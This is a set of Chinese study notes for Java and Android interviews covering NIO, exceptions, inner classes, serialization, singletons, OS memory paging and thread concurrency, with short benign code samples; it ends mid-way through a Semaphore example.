Java IO的各种流是阻塞的。这意味着，当一个线程调用read() 或 write()时，该线程被阻塞，直到有一些数据被读取，或数据完全写入。该线程在此期间不能再干任何事情了。 Java NIO的非阻塞模式，使一个线程从某通道发送请求读取数据，但是它仅能得到目前可用的数据，如果目前没有数据可用时，就什么都不会获取。而不是保持线程阻塞，所以直至数据变的可以读取之前，该线程可以继续做其他的事情。 非阻塞写也是如此。一个线程请求写入一些数据到某通道，但不需要等待它完全写入，这个线程同时可以去做别的事情。 线程通常将非阻塞IO的空闲时间用于在其它通道上执行IO操作，所以一个单独的线程现在可以管理多个输入和输出通道（channel）。

**Channel，通道。传统IO的流（inputstream、outputstream）是单向的同步的**，通道则是双向的异步的。它与Buffer进行交互。



```java
Selector selector = Selector.open();

channel.configureBlocking(false);

SelectionKey key = channel.register(selector, SelectionKey.OP_READ);

while(true) {

  int readyChannels = selector.select();

  if(readyChannels == 0) continue;

  Set<SelectionKey> selectedKeys = selector.selectedKeys();

  Iterator<SelectionKey> keyIterator = selectedKeys.iterator();

  while(keyIterator.hasNext()) {

    SelectionKey key = keyIterator.next();

    if(key.isAcceptable()) {
        // a connection was accepted by a ServerSocketChannel.

    } else if (key.isConnectable()) {
        // a connection was established with a remote server.

    } else if (key.isReadable()) {
        // a channel is ready for reading

    } else if (key.isWritable()) {
        // a channel is ready for writing
    }

    keyIterator.remove();
  }
}
```

**注意register的第二个参数，这个参数是一个“关注集合”，代表我们关注的channel状态，有四种基础类型可供监听：**

- Connect
- Accept
- Read
- Write



一旦我们向Selector注册了一个或多个channel后，就可以调用select来获取channel。select方法会返回所有处于就绪状态的channel。

select方法具体如下：

> int select()
> int select(long timeout)
> int selectNow()

select()方法在返回channel之前处于阻塞状态。 select(long timeout)和select做的事一样，不过他的阻塞有一个超时限制。

selectNow()不会阻塞，根据当前状态立刻返回合适的channel。

select()方法的返回值是一个int整形，代表有多少channel处于就绪了。也就是自上一次select后有多少channel进入就绪。

老张爱喝茶，废话不说，煮开水。
出场人物：老张，水壶两把（普通水壶，简称水壶；会响的水壶，简称响水壶）。
1 老张把水壶放到火上，立等水开。（同步阻塞）
老张觉得自己有点傻
2 老张把水壶放到火上，去客厅看电视，时不时去厨房看看水开没有。（同步非阻塞）
老张还是觉得自己有点傻，于是变高端了，买了把会响笛的那种水壶。水开之后，能大声发出嘀~~~~的噪音。
3 老张把响水壶放到火上，立等水开。（异步阻塞）
老张觉得这样傻等意义不大
4 老张把响水壶放到火上，去客厅看电视，水壶响之前不再去看它了，响了再去拿壶。（异步非阻塞）
老张觉得自己聪明了。

所谓同步异步，只是对于水壶而言。
普通水壶，同步；响水壶，异步。
虽然都能干活，但响水壶可以在自己完工之后，提示老张水开了。这是普通水壶所不能及的。
同步只能让调用者去轮询自己（情况2中），造成老张效率的低下。

所谓阻塞非阻塞，仅仅对于老张而言。
立等的老张，阻塞；看电视的老张，非阻塞。
情况1和情况3中老张就是阻塞的，媳妇喊他都不知道。虽然3中响水壶是异步的，可对于立等的老张没有太大的意义。所以一般异步是配合非阻塞使用的，这样才能发挥异步的效用。



查一查面试题目！！！

### 异常

• **try** -- 用于监听。将要被监听的代码(可能抛出异常的代码)放在try语句块之内，当try语句块内发生异常时，异常就被抛出。

• **catch** -- 用于捕获异常。catch用来捕获try语句块中发生的异常。

• **finally** -- finally语句块总是会被执行。它主要用于回收在try块里打开的物力资源(如数据库连接、网络连接和磁盘文件)。只有finally块，执行完成之后，才会回来执行try或者catch块中的return或者throw语句，如果finally中使用了return或者throw等终止方法的语句，则就不会跳回执行，直接停止。

• **throw** -- 用于抛出异常。

• **throws** -- 用在方法签名中，用于声明该方法可能抛出的异常。



**try finally**

 finally语句在return语句执行之后return返回之前执行的。

finally块中的return语句会覆盖try块中的return返回。

如果finally语句中没有return语句覆盖返回值，那么原来的返回值可能因为finally里的修改而改变也可能不变。

finally块的语句在try或catch中的return语句执行之后返回之前执行且finally里的修改语句可能影响也可能不影响try或catch中 return已经确定的返回值，若finally里也有return语句则覆盖try或catch中的return语句直接返回。

### Object 相关重写方法及拷贝

**equals：**

（1）自反性：x.equals(x)必须返回true。

（2）对称性：x.equals(y)与y.equals(x)的返回值必须相等。

（3）传递性：x.equals(y)为true，y.equals(z)也为true，那么x.equals(z)必须为true。

（4）一致性：如果对象x和y在equals()中使用的信息都没有改变，那么x.equals(y)值始终不变。

（5）非null：x不是null，y为null，则x.equals(y)必须为false。

**hashcode**

虽然不能根据hashcode值判断两个对象是否相等，但是可以直接根据hashcode值判断两个对象不等，如果两个对象的hashcode值不等，则必定是两个不同的对象。如果要判断两个对象是否真正相等，必须通过equals方法。

**clone**

深拷贝和浅拷贝

也可以通过序列化实现深拷贝

将每一个引用对象都进行一次深拷贝就可以变成深拷贝

**1、基本数据类型能自动实现深度clone**。

**2、String**是一个例外。   **但对于我们编程来说可以和操作基本数据类型一样做**，基本没影响。大大方便了我们的编程。*

   String类型的变量clone后的**表现好象也实现了深度clone**，但其实只是一个假象。
   因为执行 cloned.name = "new";语句时，它作用相当于生成了一个新的string类型，然后又赋回给cloned.name。
   这是因为string被sun公司的工程师写成了一个不可更改的类（immutable class），在所有string类中的函数都不能更改自身的值。

说到底因为string 不可改变，所以不管改变原来的引用值还是新的新的引用都是新生成对象，对原来对象不造成影响。

==> 这告诉我们支持更方便实现克隆的一种途径：**将自己定义的类编写为不可更改。**

**3、StringBuffer**需要做特殊处理
   String和StringBuffer有区别。
   可以借鉴类似技巧对StringBuffer型的变量实现克隆效果：sb=new StringBuffer(sb.toString());









**wait**



**notify**



**notifyAll**



手写生产者消费者



### 抽象类，内部类

| **参数**  | **抽象类**                                  | **接口**                                   |
| ------- | ---------------------------------------- | ---------------------------------------- |
| 默认的方法实现 | 它可以有默认的方法实现                              | 接口完全是抽象的。它根本不存在方法的实现                     |
| 实现      | 子类使用**extends**关键字来继承抽象类。如果子类不是抽象类的话，它需要提供抽象类中所有声明的方法的实现。 | 子类使用关键字**implements**来实现接口。它需要提供接口中所有声明的方法的实现 |
| 构造器     | 抽象类可以有构造器                                | 接口不能有构造器                                 |
|         |                                          |                                          |
| 访问修饰符   | 抽象方法可以有**public**、**protected**和**default**这些修饰符 | 接口方法默认修饰符是**public**。你不可以使用其它修饰符。        |
|         |                                          |                                          |
| 多继承     | 抽象方法可以继承一个类和实现多个接口                       | 接口只可以继承一个或多个其它接口                         |
| 成员变量    | 各种类型                                     | public static final                      |
|         |                                          |                                          |



　    1）抽象类可以提供成员方法的实现细节，而接口中只能存在public abstract 方法；

　　2）抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是public static final类型的；

　　3）接口中不能含有静态代码块以及静态方法，而抽象类可以有静态代码块和静态方法；

　　4）一个类只能继承一个抽象类，而一个类却可以实现多个接口。



java内部类可以访问外部类的field，如何做到的

http://blog.csdn.net/jeep_ouc/article/details/39119249

这句话的意思是， 在内部类Outer$Inner中， 存在一个名字为this$0 ， 类型为Outer的成员变量， 并且这个变量是final的。 其实这个就是所谓的“在内部类对象中存在的指向外部类对象的引用”。但是我们在定义这个内部类的时候， 并没有声明它， 所以这个成员变量是编译器加上的。

1 编译器自动为内部类添加一个成员变量， 这个成员变量的类型和外部类的类型相同， 这个成员变量就是指向外部类对象的引用； 
2 编译器自动为内部类的构造方法添加一个参数， 参数的类型是外部类的类型， 在构造方法内部使用这个参数为1中添加的成员变量赋值； 
3 在调用内部类的构造函数初始化内部类对象时， 会默认传入外部类的引用。



所以说， 编译器会为内部类的构造方法添加一个参数， 参数的类型就是外部类的类型。 





**一问匿名内部类中接口没什么能new，回答本来就说类；二问视频上传的流程，我回答用的是单线程，面试官建议使用多线程；三问webview加载js安全问题，回答网上已有解决方案。。。四问二叉树怎么定义，怎么遍历；五问json解析有那几种，写json解析的思路 收起**



内部类：

![img](https://images2017.cnblogs.com/blog/999804/201707/999804-20170730214851115-108591913.png)



匿名内部类：onCLickLinstener

局部内部类：方法中定义的类

成员内部类： 类中定义的子类：

**静态内部类：**

1）首先，用内部类是因为内部类与所在外部类有一定的关系，往往只有该外部类调用此内部类。所以没有必要专门用一个Java文件存放这个类。
2）静态都是用来修饰类的内部成员的。比如静态方法，静态成员变量，静态常量。它唯一的作用就是随着类的加载（而不是随着对象的产生）而产生，以致可以用类名+静态成员名直接获得。

也称为嵌套，水说到底，只是借个壳，跟外部类没有多大关系，不依赖外部类实例



1. 普通内部类可以访问其外部类的各种类型成员，但是静态内部类只能访问静态成员
2. 普通内部类里面不能定义各种静态的成员（包括静态变量、静态方法、静态代码块和静态内部类），而静态内部类中则可以；
   - 静态变量和静态方法会出现这个语法错误(static methods can only be declared in a static or top level type)意思就是static方法只能在静态或者顶级类型（顶级类型应该就是外部类中）中声明，当然static变量和static内部类也是一样的道理。**原因在静态变量和静态方法都只需要通过类名就能访问，不必通过任何实例化对象；而普通内部类的初始化要利用外部类的实例化对象，这明显违背了static的设计初衷。**



**静态内部类只能访问静态成员！！！！**

**为什么内部类调用的外部变量必须是final修饰的？**

*因为生命周期的原因。方法中的局部变量，方法结束后这个变量就要释放掉，final保证这个变量始终指向一个对象。首先，内部类和外部类其实是处于同一个级别，内部类不会因为定义在方法中就会随着方法的执行完毕而跟随者被销毁。问题就来了，如果外部类的方法中的变量不定义final，那么当外部类方法执行完毕的时候，这个局部变量肯定也就被GC了，然而内部类的某个方法还没有执行完，这个时候他所引用的外部变量已经找不到了。如果定义为final，**java会将这个变量复制一份作为成员变量内置于内部类中，这样的话**，由于final所修饰的值始终无法改变，所以这个变量所指向的内存区域就不会变。 *



1.内部类可以很好的实现隐藏

 一般的非内部类，是不允许有 private 与protected权限的，但内部类可以

2．内部类拥有外围类的所有元素的访问权限

3.可是实现间接的多重继承

4.可以避免修改接口而实现同一个类中两种同名方法的调用。





### 序列化

举个例子：网络传输的时候，可以传字符串，亦可以传对象object，例如socket，传字符串的时候接收方很容易解析出来，但是，传一个对象的时候，对方读完字节流后，不知道你传的什么对象，所以没办法给转成原来的对象并解析对象的属性，这时候就要用到序列化和反序列化。类实现序列化接口，socket发送这个对象的字节流，接收方到流后就可以将流反序列化成对象，然后使用对象的方法和属性。

**序列化原理？？？？**

**Serilizable下**

使用transient 关键字来使对象不被序列化；

静态变量无法被序列化

serialVersionUID的详细工作过程是这样的：序列化的时候系统会把当前类的serialVersionUID写入序列化的二进制文件中，当反序列化的时候系统会检测文件中的serialVersionUID是否和当前类的serialVersionUID一致，如果一致就说明序列化的类的版本和当前类的版本是相同的，这个时候可以成功反序列化；否则说明当前类和反序列化的类相比发生了某些变化，比如成员变量的数量、类型发生了变化，这个时候是无法正常反序列化的。

一般来说，我们应该手动指定serialVersionUID的值，比如1L，也可以让IDE根据当前类的结构自动去生成它的hash值，这样序列化和反序列化时两者的serialVersionUID是相同的，因此可以正常进行反序列化操作。`如果不手动指定serialVersionUID的值`反序列化时当前类有些改变，比如增加或者删除了某些成员变量，那么系统就会重新计算当前类的hash值并把它赋值给serialVersionUID，这个时候当前类的serialVersionUID就和反序列化数据中的serialVersionUID不一致，就会造成反序列化失败的结果。所以，`手动指定serialVersionUID可以在很大程度上避免反序列化过程的失败。`

**parcelibale**



### java final static 关键字  方法，类，对象

final：

修饰变量:值不可改变、

修饰方法参数：参数值不会改变

修饰方法，表示该方法无法被重写；

修饰类，表示该类无法被继承。



public ：all

private : 当前类可见

protected： 子孙类，同一个package

default :同一package



static

static 方法

static 变量 类初次加载

static 代码块 类初次加载

static是不允许用来修饰局部变量

所有的静态方法和静态变量都可以通过对象访问（只要访问权限足够）。（this.///)



**首先结论是：java中静态属性和和静态方法可以被继承，如果子类也有该静态方法生命和实现，那么父类的静态方法没有被重写（overwrite）而是被隐藏。**

静态方法和属性是属于类的，调用的时候直接通过类名.方法名完成的，不需继承机制就可以调用如果子类里面定义了静态方法和属性，那么这时候父类的静态方法 或属性称之为“隐藏”，你如果想要调用父类的静态方法和属性，直接通过父类名.方法名或变量名完成，至于是否继承一说，子类是有继承静态方法和属性，但是 跟实例方法和属性不太一样，存在“隐藏”的这种情况。

多态之所以能够实现是依赖于 继承 接口和 重写 、重载（继承和重写最为关键）。有了继承和重写就可以  实现父类的引用可以指向不同子类的对象。重写的功能是：“重写”后子类的优先级要高于父类的优先级，但是“隐藏”是没有这个优先级之分的。

静态属性、静态方法和非静态的属性都可以被 继承 和 隐藏  而不能够被重写，因此不能实现多态，不能实现父类的引用可以指向不同子类的对象。       非静态的方法可以被继承和重写，因此可以实现多态。

静态方法不能被重写，静态方法为静态方法从程序开始运行后就已经分配了内存，也就是说已经写死了。所有引用到该方法的对象（父类的对象也好子类的对象也好）所指向的都是同一块内存中的数据，不适用于多态。



## 单例模式

单例模式在平时算比较常见，有关java单例模式的写法有很多种，在这里分析一种比较好的写法。

## 代码

```
public class Test {
    private volatile static Test instance;

    private Test() {

    }

    public static Test getInstance() {
        if (instance == null) {
            synchronized (Test.class) {
                if (instance == null) {
                    instance = new Test();
                }
            }
        }
        return instance;
    }
}123456789101112131415161718
```

## 解析

- 第一个注意点：使用私有的构造函数，确保正常情况下该类不能被外部初始化（非正常情况比如通过反射初始化，一般使用反射之后单例模式也就失去效果了）。
- 第二个注意点：getInstance方法中第一个判空条件，逻辑上是可以去除的，去除之后并不影响单例的正确性，但是去除之后效率低。因为去掉之后，不管instance是否已经初始化，都会进行synchronized操作，而synchronized是一个重操作消耗性能。加上之后，如果已经初始化直接返回结果，不会进行synchronized操作。
- 第三个注意点：加上synchronized是为了防止多个线程同时调用getInstance方法时，各初始化instance一遍的并发问题。
- 第四个注意点：getInstance方法中的第二个判空条件是不可以去除，如果去除了，**并且刚好有两个线程a和b都通过了第一个判空条件**。此时假设a先获得锁，进入synchronized的代码块，初始化instance，a释放锁。接着b获得锁，进入synchronized的代码块，也直接初始化instance，instance被初始化多遍不符合单例模式的要求~。加上第二个判空条件之后，b获得锁进入synchronized的代码块，此时instance不为空，不执行初始化操作。
- 第五个注意点：instance的声明有一个voliate关键字，如果不用该关键字，有可能会出现异常。因为instance = new Test();并不是一个原子操作，会被编译成三条指令，如下所示。 
  1.给Test的实例分配内存 2.初始化Test的构造器 3.将instance对象指向分配的内存空间（注意 此时instance就不为空） 
  然后咧，java会指令重排序，JVM根据处理器的特性，充分利用多级缓存，多核等进行适当的指令重排序，使程序在保证业务运行的同时，充分利用CPU的执行特点，最大的发挥机器的性能！简单来说就是jvm执行上面三条指令的时候，不一定是1-2-3这样执行，有可能是1-3-2这样执行。如果jvm是按照1-3-2来执行的话，当1-3执行完2还没执行的时候，如果另外一个线程调用getInstance()，因为3执行了此时instance不为空，直接返回instance。问题是2还没执行，此时instance相当于什么都没有，肯定是有问题的。然后咧，**voliate有一个特性就是禁止指令重排序**，上面的三条指令是按照1-2-3执行的，这样就没有问题了。











## 并发编程

### 线程与进程区别，为什么要有线程

进程是cpu资源分配的最小单位，线程是cpu调度的最小单位。以前进程既是资源分配也是调度的最小单位，后来为了更合理的使用cpu(实际上是cpu性能越来越好)，才将资源分配和调度分开，就有了线程。线程是建立在进程的基础上的一次程序运行单位。

进程切换分两步1.切换页目录以使用新的地址空间2.切换内核栈和硬件上下文。对于linux来说，内核不区分进程和线程, 线程和进程的最大区别就只在于地址空间。

对于一个进程内的线程切换，第1步是不需要做的，第2是进程和线程切换都要做的。



**java中的线程和操作系统的线程区别**

http://blog.csdn.net/yangmx_5/article/details/68065299



## 基本分页储存管理方式

**因此需要一个页表来记录逻辑地址和实际存储地址之间的映射关系，以实现从页号到物理块号的映射。**

由于页表也是存储在内存中的，因此和不适用分页管理的存储方式相比，访问分页系统中内存数据需要**两次的内存访问**(一次是从内存中访问页表，从中找到指定的物理块号，加上页内偏移得到实际物理地址；第二次就是根据第一次得到的物理地址访问内存取出数据)。

![img](https://camo.githubusercontent.com/7e734fc84ce6cde907fc4878f881dfa8211e5866/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d383033363361333734633435333132342e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)



## 基本分段储存管理方式

分页是为了提高内存利用率，而分段是为了满足程序员在编写代码的时候的一些逻辑需求(比如数据共享，数据保护，动态链接等)。

![img](https://camo.githubusercontent.com/da0a0162f5e07a353b328f43a5f7422fa23f9ad7/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d633062643133613038313066636162622e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

页是信息的物理单位，是出于系统内存利用率的角度提出的离散分配机制；段是信息的逻辑单位，每个段含有一组意义完整的信息，是出于用户角度提出的内存管理机制

页的大小是固定的，由系统决定；段的大小是不确定的，由用户决定

## 五、页面置换算法

**最佳置换算法：** 只具有理论意义的算法，用来评价其他页面置换算法。置换策略是将当前页面中在未来最长时间内不会被访问的页置换出去。

**先进先出置换算法：** 简单粗暴的一种置换算法，没有考虑页面访问频率信息。每次淘汰最早调入的页面。

**最近最久未使用算法LRU：** 算法赋予每个页面一个访问字段，用来记录上次页面被访问到现在所经历的时间t，每次置换的时候把t值最大的页面置换出去(实现方面可以采用寄存器或者栈的方式实现)。

**时钟算法clock(也被称为是最近未使用算法NRU)：** 页面设置一个访问位，并将页面链接为一个环形队列，页面被访问的时候访问位设置为1。页面置换的时候，如果当前指针所指页面访问为为0，那么置换，否则将其置为0，循环直到遇到一个访问为位0的页面。

**改进型Clock算法：** 在Clock算法的基础上添加一个修改位，替换时根究访问位和修改位综合判断。优先替换访问位和修改位都是0的页面，其次是访问位为0修改位为1的页面。

**最少使用算法LFU：** 设置寄存器记录页面被访问次数，每次置换的时候置换当前访问次数最少的。



**线程实现分类**

用户级线程的创建、撤销和调度不需要OS内核的支持，是在语言这一级处理的；

而内核支持线程的创建、撤销和调度都需OS内核提供支持，而且与进程的创建、撤消和调度大体是相同的。

- 内核线程：

内核线程就是内核的分身，一个分身可以处理一件特定事情。这在处理异步事件如异步IO时特别有用。内核线程的使用是廉价的，唯一使用的资源就是内核栈和上下文切换时保存寄存器的空间。支持多线程的内核叫做多线程内核(Multi-Threads kernel )。

- 轻量级的进程lwp

轻量级进程(LWP)是建立在内核之上并由内核支持的用户线程，它是内核线程的高度抽象，每一个轻量级进程都与一个特定的内核线程关联。内核线程只能由内核管理并像普通进程一样被调度。

![内核级线程的实现方式](http://img.blog.csdn.net/20160712204335517)

- 用户线程

用户线程是完全建立在用户空间的线程库，用户线程的创建、调度、同步和销毁全又库函数在用户空间完成，不需要内核的帮助。因此这种线程是极其低消耗和高效的。

![用户级线程的实现方式,](http://img.blog.csdn.net/20160712204159672)

LWP虽然本质上属于用户线程，但LWP线程库是建立在内核之上的，LWP的许多操作都要进行系统调用，因此效率不高。而这里的用户线程指的是完全建立在用户空间的线程库，用户线程的建立，同步，销毁，调度完全在用户空间完成，不需要内核的帮助。因此这种线程的操作是极其快速的且低消耗的

- 组合方式

在一些系统中，使用**组合方式的多线程实现**, 线程创建完全在用户空间中完成，线程的调度和同步也在应用程序中进行. 一个应用程序中的多个用户级线程被映射到一些（小于或等于用户级线程的数目）内核级线程上。

在这种模型中，每个内核级线程有一个可以轮流使用的用户级线程集合.

![用户级与内核级的组合实现方式](http://img.blog.csdn.net/20160712204353861)

**Sun JDK,它的Windows版本和Linux版本都使用一对一的线程模型实现，一条Java线程就映射到一条轻量级进程之中。** 

Solaris 则支持多对对，随意与操作系统有关

**java线程调度:**

- **协同式线程调度，线程执行时间由线程本身来控制**. 易阻塞
- **Java线程调度就是抢占式调度** 线程优先级可以提高调度，但优先级是很靠谱，因为Java线程是通过映射到系统的原生线程上来实现的，所以线程调度最终还是取决于操作系统。

**java 线程状态转换：**

- 新建

- 运行 

  Runnable包括操作系统线程状态中的Running和Ready，也就是处于此状态的线程有可能正在执行，也有可能等待CPU为它分配执行时间。线程对象创建后，其他线程调用了该对象的start()方法。该状态的线程位于“可运行线程池”中，变得可运行，只等待获取CPU的使用权。即在就绪状态的进程除CPU之外，其它的运行所需资源都已全部获得。 

- 无限期等待

  该状态下线程不会被分配CPU执行时间，要等待被其他线程显式唤醒。如没有设置timeout的object.wait()方法

- 限期等待

  不会被分配CPU执行时间，不过无须等待被其他线程显式唤醒，在一定时间之后会由系统自动唤醒。如Thread.sleep()，设置了timeout的object.wait()

- 阻塞

  线程被阻塞了。与等待状态的区别是：**阻塞在等待着获取到一个排他锁，这个事件将在另外一个线程放弃这个锁的时候发生**；而等待则在等待一段时间，或唤醒动作的发生。在等待进入同步区域时，线程将进入这种状态。 

  阻塞的情况分三种：

  - 等待阻塞：运行的线程执行wait()方法，该线程会释放占用的所有资源，JVM会把该线程放入“等待池”中。进入这个状态后，是不能自动唤醒的，必须依靠其他线程调用notify()或notifyAll()方法才能被唤醒，，即无限期等待 
  - 同步阻塞：运行的线程在获取对象的同步锁时，若该同步锁被别的线程占用，则JVM会把该线程放入“锁池”中。
  - 其他阻塞：运行的线程执行sleep()或join()方法。或者发出了I/O请求时，JVM会把该线程置为阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。

- 6、**结束(Terminated)**：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。 

  ![这里写图片描述](http://img.blog.csdn.net/20170823170657224?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvbmFsYW5taW5nZGlhbg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)

 常用方法：

sleep：在指定的毫秒数内让当前正在执行的线程休眠（暂停执行），**不会让出cpu资源**

wait：进入线程等待池中等待，**让出cpu资源**

**yield**：**暂停当前正在执行的线程对象，让出cpu资源,并执行其他线程**，,使用yield()的目的是让相同优先级的线程之间能适当的轮转执行。

**join**:等待该线程执行结束

**interrup：interrupte**()方法并不会立即执行中断操作；具体而言，这个方法只会给线程设置一个为true的中断标志（**中断标志只是一个布尔类型的变量**），而设置之后，则根据线程当前的状态进行不同的后续操作。

如果，线程的当前状态处于非阻塞状态，那么仅仅是线程的中断标志被修改为true而已；

如果线程的当前状态处于阻塞状态，那么在将中断标志设置为true后，还会有如下三种情况之一的操作：

- 如果是wait、sleep以及jion三个方法引起的阻塞，那么会将线程的中断标志**重新设置为false**，并抛出一个InterruptedException；
- 如果是java.nio.channels.InterruptibleChannel进行的io操作引起的阻塞，则会对线程抛出一个ClosedByInterruptedException；（待验证）
- 如果是轮询（java.nio.channels.Selectors）引起的线程阻塞，则立即返回，不会抛出异常。（待验证）



**调用线程类的interrupt方法，其本质只是设置该线程的中断标志，将中断标志设置为true，并根据线程状态决定是否抛出异常**。因此，通过interrupt方法真正实现线程的中断原理是：**开发人员根据中断标志的具体值，来决定如何退出线程。**

区别：

1.interrupted是静态方法，返回的是当前线程的中断状态。例如，如果当前线程被中断（没有抛出中断异常，否则中断状态就会被清除），你调用interrupted方法，第一次会返回true。然后，当前线程的中断状态被方法内部清除了。第二次调用时就会返回false。如果你刚开始一直调用isInterrupted，则会一直返回true，除非中间线程的中断状态被其他操作清除了。

2.interrupted()测试的是当前的线程的中断状态。

而isInterrupted()测试的是调用该方法的对象所表示的线程。

**wait**：

Obj.wait()，与Obj.notify()必须要与synchronized(Obj)一起使用，也就是wait,与notify是针对已经获取了Obj锁进行操作，从语法角度来说就是Obj.wait(),Obj.notify必须在synchronized(Obj){...}语句块内。从功能上来说wait就是说线程在获取对象锁后，主动释放对象锁，同时本线程休眠。直到有其它线程调用对象的notify()唤醒该线程，才能继续获取对象锁，并继续执行。相应的notify()就是对对象锁的唤醒操作。但有一点需要注意的是notify()调用后，并不是马上就释放对象锁的，而是在相应的synchronized(){}语句块执行结束，自动释放锁后，JVM会在wait()对象锁的线程中随机选取一线程，赋予其对象锁，唤醒线程，继续执行。这样就提供了在线程间同步、唤醒的操作。Thread.sleep()与Object.wait()二者都可以暂停当前线程，释放CPU控制权，主要的区别在于Object.wait()在释放CPU同时，释放了对象锁的控制。



notify 和notifyall 区别： notify 只会唤醒一个正在wait当前对象锁的线程，而notifyall 绘画逆行所有。

​	notify唤醒哪一个线程有虚拟机控制，notifyall唤醒所有并不是所有线程都会立刻执行，而是知识解除了wait状态，接下来还需要竞争锁资源。





**wait 如果获得锁成功后，那么该线程就会沿着wait方法之后的路径继续执行。注意是沿着wait方法之后**

**为什么wait要放到while循环中？**

```java
public synchronized void threadPrint(int i,int n){
            /*该处应用while来判断是否轮到该线程执行，假如用If判断的话，如果该线程阻塞后再次被唤醒执行时（其他线程调用this.notifyAll()），
              他会从this.wait()后面的代码开始执行，即时没轮到该线程执行*/
          while(this.isA != n){
              try {
                   this.wait();
              } catch (Exception e) {
                  // TODO: handle exception
              }
          }
          for(int j=0;j<5;j++){
              System.out.println(Thread.currentThread().getName()+":"+(j+1)+" loop in "+(i+1));
          }
         this.isA  = (this.isA+1)%3;//将权限传递给后一个进程62         this.notifyAll();
      }
```

如果被唤醒后，会继续执行wait后的代码，但是有可能被唤醒时条件仍然不满足（因为被别的线程修改了），所以需要while循环再次进行一下判断。



**三者为什么要跟synchronized一起使用？**

原子性，有可能在wait时，已经notify了，不符合预期





**所用在类，对象，方法区别**

```
Java的synchronized加在方法上或者对象上区别如下：
1.synchronized 在方法上，所有这个类的加了 synchronized 的方法，在执行时，会获得一个该类的唯一的同步锁，当这个锁被占用时，其他的加了 synchronized 的方法就必须等待
2.加在对象上的话，就是以这个对象为锁，其他也以这个对象为锁的代码段，在这个锁被占用时，就必须等待
```





### 创建线程的三种方式

1.继承Thread类，重写run方法，run方法为执行体

2.实现Runnable接口，重写run方法

3.通过callback和Future创建线程

调用FutureTask对象的get()方法来获得子线程执行结束后的返回值，调用get()方法会阻塞线程。

```
public class ThreadTest implements Callable<Integer> {
    
    @Override
    public Integer call() throws Exception {
        return 5;
    }

    public static void main(String[] args) {
        try {
        ThreadTest threadTest = new ThreadTest();
        FutureTask<Integer> futureTask = new FutureTask<Integer>(threadTest);
        new Thread(futureTask,"有返回值的线程").start();
        futureTask.get();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (ExecutionException e) {
            e.printStackTrace();
        }
    }
}
```

如果一个类继承Thread，则不适合资源共享。但是如果实现了Runable接口的话，则很容易的实现资源共享。

继承Thread是多个线程分别完成自己的任务，实现Runnable是多个线程共同完成一个任务。

**总结：**

**实现Runnable接口比继承Thread类所具有的优势：**

**1）：适合多个相同的程序代码的线程去处理同一个资源**

**2）：可以避免java中的单继承的限制**

**3）：增加程序的健壮性，代码可以被多个线程共享，代码和数据独立**

**4）：线程池只能放入实现Runable或callable类线程，不能直接放入继承Thread的类**





### Runable,Callable,Future,FutureTask四者的关系。

- Runable: 一个接口，常用于执行异步任务，有一个抽象方法`void run()`,该方法没有返回值。

```
public interface Runnable {
    public void run();
}
1234
```

- Callable: 一个接口，常用于执行异步任务,有一个抽象方法`V call()`,该方法含有返回值。

```
public interface Callable<V> {
    V call() throws Exception;
}
1234
```

- Future: Runable和Callable就像脱缰的野马，提交给线程就没法进行管理了。而Future则是用来管理他们的，可以取消任务，获取结果等。

```
public interface Future<V> {

    boolean cancel(boolean mayInterruptIfRunning);

    boolean isCancelled();

    boolean isDone();
    V get() throws InterruptedException, ExecutionException;
    V get(long timeout, TimeUnit unit)
        throws InterruptedException, ExecutionException, TimeoutException;
}
123456789101112
```

- FutureTask是Future的一个实现类。用来包装Runable和Callable，使其可控制。常规用法如下。

```
   //创建一个Callable对象，在实现方法中写耗时操作
   Callable callable= new Callable<Bitmap>() {
            @Override
            public Bitmap call() throws Exception {
                return loadBitmap(url);
            }
        }；
    //使用FutureTask包装Callable，使其可控制
    FutureTask<Bitmap> futureTask=new FutureTask<Bitmap>(callable);

    //提交到线程中 
     new Thread(futureTask).start();

     //阻塞直到获取结果,如果不想阻塞，就重写done方法，在里面get()
     Bitmap bitmap= futureTask.get();
```



**asyncTask**

**构造函数：**

初始化一个实现了callable的worker，在这个callable内调用**doInBackGround**（），返回postResult（内部**handler**执行finish->**postExecute()**）

用这个worker来初始化一个futuretask

修改运行状态；

调用preExecute

**execute：**

- 调用DefaultExecutor 来执行future；
- 在DefaultExecutor内部维护了一个ArrayDeque;
- 在重写的execute方法内部 将传入的runable加入到ArrayDeque中；同时修改了一下传入的Runable,在run方法执行完后会调用SheduleNext，从队列中去除一个来真正的执行；
- 将取出来的runable放入我们的THREAD_POOL_EXECUTOR（Fixed）









###线程如何关闭

1.在代码中事先使用标志位，满足条件，自动退出，也就是run方法块执行完毕

2.使用stop强行终止，已经被废弃3.使用interrupt，interrupt决堤作用机制见上文。因此两种情况，阻塞时直接抛异常；非阻塞知识改变标志位，需要wile循环判断。



### 线程间传递数据

1.构造函数传入数据

2.thread中提供方法传入数据，一般是在start之前

3.回调函数

4.exchanger

###如何控制某个方法允许并发访问线程的个数

Semaphore两个重要的方法就是

semaphore.acquire() 请求一个信号量，这时候的信号量个数-1（一旦没有可使用的信号量，也即信号量个数变为负数时，再次请求的时候就会阻塞，直到其他线程释放了信号量）

semaphore.release() 释放一个信号量，此时信号量个数+1

```java
public class SemaphoreTest {  
    private Semaphore mSemaphore = new Semaphore(5);  
    public void run(){  
        for(int i=0; i< 100; i++){  
            new Thread(new Runnable() {  
                @Override  
                public void run() {  
                    test();  
                }  
            }).start();  
        }  
    }  
  
    private void test(){  
        try {  
            mSemaphore.acquire();  
        } catch (InterruptedException e) {  
            e.printStackTrace();  
        }  
        System.out.println(Thread.currentThread().getName() + " 进来了");  
        try {  
            Thread.sleep(1000);  
        } catch (InterruptedException e) {  
            e.printStackTrace();  
        }  
        System.out.println(Thread.currentThread().getName() + " 出去了");  
        mSemaphore.release();  
    }  
